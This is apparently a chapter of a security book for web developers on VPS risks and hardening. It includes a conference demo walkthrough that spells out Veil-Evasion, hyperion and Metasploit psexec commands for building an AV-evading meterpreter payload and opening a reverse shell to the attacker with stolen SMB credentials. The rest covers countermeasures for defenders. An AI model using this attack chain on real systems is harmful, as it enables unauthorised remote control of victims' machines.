# VPS {#vps}

![10,000' view of VPS Security](images/10000VPS.gif)

If possible, I usually advocate bringing VPS(s) [in-house](http://blog.binarymist.net/2014/11/29/journey-to-self-hosting/) where you have control. A lot of the ideas in this section originated from a blog post of mine on [hardening Debian web servers](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/).

## 1. SSM Asset Identification
Take results from [higher level Asset Identification](#ssm-asset-identification). Remove any that are not applicable. Add any newly discovered.

## 2. SSM Identify Risks
Go through same process as we did at the [top level](#ssm-identify-risks), but for your VPS(s).

* [MS Host Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007)
* [MS Securing Your Web Server](https://msdn.microsoft.com/en-us/library/ff648653.aspx) This is Windows specific, but does offer some insight into technology agnostic risks and countermeasures.
* [MS Securing Your Application Server](https://msdn.microsoft.com/en-us/library/ff648657.aspx) As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts

### Forfeit Control thus Security {#vps-identify-risks-forfeit-control-thus-security}
![](images/ThreatTags/average-widespread-average-severe.png)

In terms of security, unless your provider is [Swiss](http://www.computerweekly.com/news/2240187513/Is-Switzerland-turning-into-a-cloud-haven-in-the-wake-of-Prism-scandal), you give up so much when you forfeit your system(s) to an external provider. I cover this in my talk ["Does Your Cloud Solution Look Like a Mushroom"](http://blog.binarymist.net/presentations-publications/#does-your-cloud-solution-look-like-a-mushroom).

* If you don't own your VPS(s), you will have very limited security, visibility and control over the infrastructure.
* Limited (at best) visibility into any hardening process your CSP takes. Essentially you "Get what you're given".
* Cloud and hosting providers are in many cases forced by governments and other agencies to give up your secrets. It's very common place now and you may not even know that it has happened. Swiss providers may be the exception here.
* What control do you have that if you're data in the cloud has been compromised you actually know about it and can invoke your incident response team(s) and procedures?
* Cloud and hosting providers are readily giving up your secrets to government organisations and the highest bidders. In many cases you won't know about it.
* Your provider may go out of business and you may get little notice of this.
* Providers are outsourcing their outsourced services to several providers deep. They don't even have visibility themselves. Control is lost.
* \> distribution = > attack surface. Where is your data? Where are your VM images running from? Further distributed on iSCSI targets? Where are the targets?
* Your provider knows little (at best) about your domain, how you operate, or what you have running on their system(s). How are they supposed to protect you if they have no knowledge of your domain?

### System Compromise {#vps-identify-risks-system-compromise}

This is pretty much a blanket heading. It really needs to be broken down more.

_Todo_

### Windows

#### PSExec {#vps-identify-risks-psexec}
![](images/ThreatTags/average-common-difficult-severe.png)

PSExec was written by Mark Russinovich as part of the Sysinternals tool suite. PSExec the tool allows you to execute programs on remote Windows systems without having to install anything on the server you want to manage or hack. Also being a telnet replacement.  
PSExec requires a few things on the target system:

1. The Server Message Bloack (SMB) service must be available and reachable (not blocked by a fire wall for example)
2. File and Print Sharing must be enabled
3. Simple File Sharing must be disabled
4. The Admin$ share (which maps to the Windows directory) must be available and accessible
5. The credentials supplied to the PSExec utility must have permissions to access the Admin$ share

The PSExec executable has a Windows Service image inside which it deploys to the Admin$ share on the target machine. The DCE/RPC interface is then used over SMB to access the Windows Service Control Manager (SCM) API. PSExec then turns on its Windows Service on the target machine. This service then creates a named pipe which can be used to send commands to the system.

The Metasploit PSExec module (`exploit/windows/smb/psexec`) uses basically the same principle.

{#wdcnz-demo-5}
![](images/HandsOnHack.png)

The following attack was the last of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-4) will provide some additional context and it's probably best to look at it first if you haven't already.

You can find the video of how it is played out [here](https://www.youtube.com/watch?v=1EvwwYiMrV4).

I> ## Synopsis
I>
I> This demo differs from the previous in that we don't rely on any of the targets direct interaction. There is no longer a need for the browser.  
I> We open a reverse shell from the victim to us using Metasploit.  
I> We use Veil-Evasion with the help of hyperion to encrypt our payload to evade AV.  
I> With this attack you will have had to have obtained the targets username and password or password hash.  
I> We leverage psexec which expects your binary to be a windows service.
I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I haven't included these steps in this play though, although the video assumes they have been included.

{icon=bomb}
G> ## The Play
G>
G> Start Veil-Evasion:  
G> `cd /opt/Veil/Veil-Evasion/ && ./Veil-Evasion.py`
G>
G> List the available payloads to encrypt:  
G> `list`
G>
G> Choose a service because we are going to use psexec to install it on the targets box and we want to open a reverse shell:  
G> `use 4`  
G> That's `c/meterpreter/rev_http_service`
G>
G> Set any options here:  
G> `set lhost <IP address that we're going to be listening on for the reverse shell>`  
G>
G> Generate the initial payload:  
G> `generate`
G>
G> Give it a name. I just selected the default of "payload"  
G> [Enter]  
G> Exit out of Veil-Evasion
G>
G> `/usr/share/veil-output/compiled/payload[n].exe` needs to be encrypted with hyperion, either on a Windows box or Linux with Wine.  
G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute force at the time of execution.  
G> The command to run is:  
G> `hyperion.exe -v payload.exe encrypted-payload.exe`  
G> We then put the encrypted payload somewhere where Metasploit can access it:  
G> I just copied it back to `/usr/share/veil-output/compiled/encrypted-payload.exe`  
G> We then tell Metasploit where we've put it.  
G> I created a Metasploit resource file:  
G> `cat ~/demo.rc`
G>
G> `use exploit/windows/smb/psexec`  
G> `set payload windows/meterpreter/reverse_http`  
G> `set lport 8080`  
G> `set lhost <IP address that we're going to be listening on for the reverse shell>`  
G> `set rhost <IP address of target>`  
G> `set exe::custom /usr/share/veil-output/compiled/encrypted-payload.exe`  
G> `set smbuser <target username>`  
G> `set smbpass <target password>`  
G> `run`  
G> The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.  
G> Now we’ve got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username & password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.
G>
G> We now run msfconsole with the resource file as parameter:  
G> `msfconsole -r ~/demo.rc`  
G> and that's enough to evade AV and get our reverse shell.
G>
G> `sessions` will show you the active sessions you have.  
G> To interact with the first one:  
G> `sessions -i 1`
G>
G> From here on in, the [video](https://www.youtube.com/watch?v=1EvwwYiMrV4) demonstrates creating a new file beside the targets hosts file, thus demonstrating full system privileges.

_Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/1)









## 3. SSM Countermeasures
* [MS Host Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007)
* [MS Securing Your Web Server](https://msdn.microsoft.com/en-us/library/ff648653.aspx) This is Microsoft specific, but does offer some insight into technology agnostic risks and countermeasures
* [MS Securing Your Application Server](https://msdn.microsoft.com/en-us/library/ff648657.aspx) As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts

### Forfeit Control thus Security {#vps-countermeasures-forfeit-control-thus-security}
![](images/ThreatTags/PreventionEASY.png)

Bringing your VPS(s) in-house provides all the flexibility/power required to mitigate just about all the risks due to outsourcing to a cloud or hosting provider. Cloud offerings are often more expensive in monetary terms for medium to large environments.

### Minimise Attack Surface by [Granular Partitioning](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#partitioning)
![](images/ThreatTags/PreventionAVERAGE.png)

By creating many partitions and [applying the least privileges](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#lock-down-the-mounting-of-partitions) necessary to each in order to be useful, you're making it difficult for an attacker to carry out many malicious activities that they would otherwise be able to. This is where you play with your `/etc/fstab`

This is a similar concept to tightly [constraining](http://blog.binarymist.net/2012/11/04/sanitising-user-input-from-browser-part-1/#minimising-the-attack-surface) input fields to only be able to accept structured data (names (alpha only) dates, social security numbers, zip codes, e-mail addresses, etc) rather than just leaving the input wide open to be able to enter any text.



### Minimise Attack Surface by Installing [Only what you Need](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#continuing-with-the-install)
![](images/ThreatTags/PreventionVERYEASY.png)

This pretty much goes without saying I think, unless you're setting up a Windows server with "all the stuff" that you have no control over. Which is why I prefer UNIX based servers. I have all the control. If anything goes wrong, it's usually my own fault.

### Review Password Strategies
![](images/ThreatTags/PreventionEASY.png)

Make sure passwords are encrypted with an algorithm that will stand up to the types of attacks you anticipate. Details [here](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#passwords). 

### Disable Remote Root Logins
![](images/ThreatTags/PreventionVERYEASY.png)

There are a handful of files to check & modify for [disabling root logins](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-remote-root-logins).

### [Harden SSH](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#ssh)
![](images/ThreatTags/PreventionVERYEASY.png)

There are a bunch of things you can do to minimise SSH being used as an attack vector.  
Use Key-pairs, Long pass-phrases. Appropriate changes to `sshd_config` file.  
AllowUsers.  
Specify Host(s).  
Consider non default port below 1025 that only root can bind to in order to stop the sshd being swapped.

### [Disable Boot Options](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-boot-options)
![](images/ThreatTags/PreventionVERYEASY.png)

Just another attack vector that should be removed

### Disable, Remove Services. Harden what's left
![](images/ThreatTags/PreventionEASY.png)

There are often a few services you can [disable](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-services-we-dont-need) even on a bare bones Debian install and some that are just easier to [remove](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#remove-services). Then go through the process of [hardening](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#secure-services) what's left. Make sure you test before and after each service you attack. Watch the port being open/closed, etc.

### [Schedule Backups](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#scheduled-backups)
![](images/ThreatTags/PreventionEASY.png)

and make sure you can restore from them. Yes it's extra work, but work that will be invaluable if those backups don't restore.  
Also consider setting up automatic updates.

### Host Intrusion Detection Systems (HIDS) {#vps-countermeasures-host-intrusion-detection-systems-hids}
![](images/ThreatTags/PreventionAVERAGE.png)

I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/05/30/evaluation-of-host-intrusion-detection-systems-hids/) of a couple of HIDS. The choice of which candidates to take into the second round came from my [initial evaluation](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#hids). 

### Logging and Alerting
![](images/ThreatTags/PreventionAVERAGE.png)

I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/04/25/web-server-log-management/) of a small collection of logging and alerting offerings. The choice of which candidates to take into the second round came from my [initial evaluation](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#logging-alerting-and-monitoring).

It's very important to make sure you have reliable and all-encompassing logging to an off-site location. This way attackers will have to also compromise that location in order to effectively [cover their tracks](http://www.win.tue.nl/~aeb/linux/hh/hh-13.html).

### Monitoring
![](images/ThreatTags/PreventionAVERAGE.png)

I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#the-following-are-better-suited-to-monitoring) of a collection of tools that one of their responsibilities was monitoring and performing actions on your processes and applications.

1. Supervisor [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#supervisor)
2. Monit [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#monit)
 * [Deep dive](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#getting-started-with-monit) into Monit. What happens if the process we use to monitor stops working? [Keep Monit Alive](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#keep-monit-alive)
3. Passenger [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#passenger)

### Host Firewall
![](images/ThreatTags/PreventionEASY.png)

[This](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#fire-walling) is one of the last things you should look at. In fact, it's not really needed if you've taking the time to remove unnecessary services and harden what's left. If you use a host firewall keep your set of rules to a minimum to reduce confusion and increase legibility. Maintain both ingress & egress.

### Windows

#### PSExec {#vps-countermeasures-psexec}

_Todo_: How hard is prevention?

![](images/ThreatTags/Prevention.png)

_Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/1)

## 4. SSM Risks that Solution Causes
> Are there any? If so what are they?

* Just beware that if you're intending to break the infrastructure or even what's running on your VPS(s) if they're hosted on someone else's infrastructure, that you make sure you have all the tests you intend to carry out documented including what could possibly go wrong, accepted and signed by your provider. Good luck with this. That's why I usually recommend self hosting.
* Keep in mind: that if you don't break your system(s), someone else will.
* Possible time constraints: It takes time to find skilled workers, gain expertise, set-up and configure.
* Many of the points I've raised around VPS hardening require maintenance.

## 5. SSM Costs and Trade-offs
> An exercise for the reader. What are they?
